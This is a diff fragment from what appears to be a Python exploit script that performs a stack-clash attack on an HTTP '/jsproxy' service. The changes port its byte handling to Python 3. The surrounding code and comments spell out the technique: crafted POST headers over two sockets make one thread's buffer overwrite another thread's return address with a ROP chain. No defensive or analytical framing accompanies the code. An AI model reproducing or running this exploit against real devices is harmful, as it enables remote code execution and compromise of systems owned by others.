@@ -28,7 +28,7 @@ system_chunks = []
 cmd_chunks = []
 
 def makeHeader(num):
-    return bytes("POST /jsproxy HTTP/1.1\r\nContent-Length: ") + bytes(str(num)) + bytes("\r\n\r\n")
+    return bytearray("POST /jsproxy HTTP/1.1\r\nContent-Length: " + str(num) + "\r\n\r\n", "ascii")
 
 def makeSocket(ip, port):
     s = socket.socket()
@@ -209,7 +209,7 @@ def stackClash(ip, port, ropChain):
     socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)
 
     # 2.2) send some bytes as post data to socket 1 (thread A)
-    socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved
+    socketSend(s1, bytearray('A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE), "ascii")) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved
 
     # 2.3) send post header with Content-Length to reserve ROP space to socket 2 (thread B)
     socketSend(s2, makeHeader(ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned
